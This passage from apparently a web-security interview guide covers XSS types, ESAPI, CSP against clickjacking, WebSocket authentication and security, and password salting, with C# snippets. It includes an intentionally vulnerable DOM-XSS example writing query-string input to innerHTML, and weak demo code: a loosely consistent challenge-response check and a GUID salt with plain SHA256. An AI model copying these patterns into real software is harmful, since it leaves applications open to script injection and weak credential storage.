There are three main types of Cross-Site Scripting (XSS):
1. Stored XSS: Malicious scripts are stored on the server (e.g., in a database) and delivered to users when they access the affected page.
2. Reflected XSS: The payload is delivered in the request (query string, form) and immediately reflected in the response.
3. DOM-based XSS: The attack occurs when client-side JavaScript dynamically updates the page with user input in an unsafe manner, causing the browser to execute injected scripts.

```csharp
// DOM-based XSS example (client-side JS, for illustration)
var search = location.search.substring(1);
document.getElementById('result').innerHTML = search; // BAD: XSS risk
```
---

# Expert

## Q57: Mention what is the basic design of OWASP ESAPI?

OWASP ESAPI (Enterprise Security API) is a set of security-related libraries designed to help developers build secure applications by providing standardized security controls. The basic design of ESAPI is centered around easy integration and consistent security practices. It wraps common security-related operations such as input validation, output encoding, authentication, access control, encryption, and logging in a unified API. Its design follows a layered approach where security logic is separated from business logic, making it easier to maintain and audit. ESAPI also supports extensibility, allowing customization of the underlying mechanisms (e.g., pluggable encryption or logging modules) per project needs. The API is available in multiple languages, including Java and .NET. Its key components include Encoder, Validator, Authenticator, AccessController, and Encryptor. The design promotes defense-in-depth by helping mitigate common vulnerabilities like injection, XSS, and CSRF.
Here is a minimal example of ESAPI-style input validation pattern in C#:

```csharp
public class InputValidator
{
    public bool IsValidEmail(string input)
    {
        return Regex.IsMatch(input, @"^[^@\s]+@[^@\s]+\.[^@\s]+$");
    }
}

// Usage
var validator = new InputValidator();
bool isValid = validator.IsValidEmail("test@example.com");
```

---

## Q58: How to use Content Security Policy (CSP) against clickjacking?

CSP can mitigate clickjacking by controlling which sources are allowed to frame your web application. The most effective CSP directive for this is `frame-ancestors`, which specifies valid parents (origins) that can embed the page in a frame, iframe, object, or embed tag. By restricting `frame-ancestors` to only your own domain or 'none', you prevent malicious sites from framing your content, thus stopping most clickjacking attempts. This is an improvement over the deprecated `X-Frame-Options` header, as CSP provides finer control and works better in complex scenarios. To implement, add the CSP header in your HTTP response. Any violation will prevent the browser from framing your site from unauthorized sources.
Minimal configuration in ASP.NET Core:

```csharp
public void Configure(IApplicationBuilder app)
{
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add(
            "Content-Security-Policy", 
            "frame-ancestors 'self';"
        );
        await next();
    });
}
```

---

## Q59: How to use CHAP Authentication (Challenge Response Authentication) for webSockets?

CHAP (Challenge-Handshake Authentication Protocol) is rarely used with WebSockets directly, as WebSockets lack built-in support for CHAP. However, you can implement a similar challenge-response mechanism at the application level. On WebSocket connection, the server sends a challenge (random nonce) to the client. The client hashes its password with the challenge and sends the result back. The server knows the client’s password (or its hash), performs the same computation, and compares the response. This prevents replay attacks since the challenge changes each time. Secure implementation should use strong cryptographic hashes and transport security (WSS).
Minimum C# code demo:

```csharp
// Server sends challenge
string nonce = Guid.NewGuid().ToString();
await socket.SendAsync(nonce);

// Client responds
string password = "userPassword";
string response = Hash(password + nonce);
await socket.SendAsync(response);

// Server verifies
bool isValid = (storedHash == Hash(password + nonce));
```

---

## Q60: How would you secure WebSockets communication on your project?

Securing WebSocket communication involves several layers:
1. Always use WSS (WebSocket over TLS) to encrypt the data.
2. Authenticate users before establishing a WebSocket connection, and re-validate tokens periodically or on each message.
3. Authorize every action, ensuring users only access permitted resources.
4. Validate all incoming data to prevent injection and other attacks.
5. Implement origin checks using the `Origin` header to prevent cross-site attacks.
6. Apply strict rate-limiting and message size limits to avoid DoS.
7. Use secure and up-to-date libraries for WebSocket handling.
8. Log and monitor connections for anomaly detection and forensics.
9. Consider using custom subprotocols to reinforce security.
Basic WSS setup in ASP.NET Core:

```csharp
var server = new WebHostBuilder()
    .UseKestrel(options => 
    {
        options.Listen(IPAddress.Any, 5001, listenOptions =>
        {
            listenOptions.UseHttps("certificate.pfx", "password");
        });
    })
    .UseStartup<Startup>()
    .Build();
server.Run();
```

---

## Q61: What is Content Security Policy (CSP)?

Content Security Policy (CSP) is a browser security mechanism to help prevent attacks like Cross-Site Scripting (XSS) and data injection by specifying which content sources are trusted. The policy is provided by the web application via HTTP headers (typically `Content-Security-Policy`). CSP controls the origins from which scripts, styles, images, fonts, and other resources can be loaded and executed. This minimizes the risk of executing untrusted code even if it’s injected into pages. CSP also offers fine-grained directives for restricting or allowing inline scripts, eval usage, or resource types. Violations are optionally reported to the backend for monitoring. Configuring CSP requires careful planning to avoid breaking legitimate functionality, but is one of the most effective ways to harden web applications.
Simple CSP header in C# for only allowing self-hosted scripts:

```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Add(
        "Content-Security-Policy", 
        "default-src 'self'; script-src 'self';"
    );
    await next();
});
```

---

## Q62: What is a Salt and How Does It Make Password Hashing More Secure?

A salt is a random value added to a password before hashing it. It ensures that the same password will result in a different hash each time, making precomputed attacks like rainbow tables ineffective. When storing a hashed password, the salt is saved alongside the hash. On authentication, the application retrieves the salt, appends it to the entered password, and hashes the combination to verify the result matches the stored hash. This way, even if two users choose identical passwords, their hashes differ. Salting greatly enhances password storage security but should be combined with slow hashing algorithms like bcrypt, PBKDF2, or Argon2 to prevent brute-force attacks. Never use a fixed or predictable salt; always generate a unique random salt per password.
C# minimal salted hash implementation using SHA256 (for demonstration, better to use dedicated libraries):

```csharp
public static (string Hash, string Salt) HashPassword(string password)
{
    var salt = Guid.NewGuid().ToString();
    var saltedPassword = password + salt;
    var hash = Convert.ToBase64String(
        SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(saltedPassword))
    );
    return (hash, salt);
}

// Usage
var result = HashPassword("superSecret123");
```
---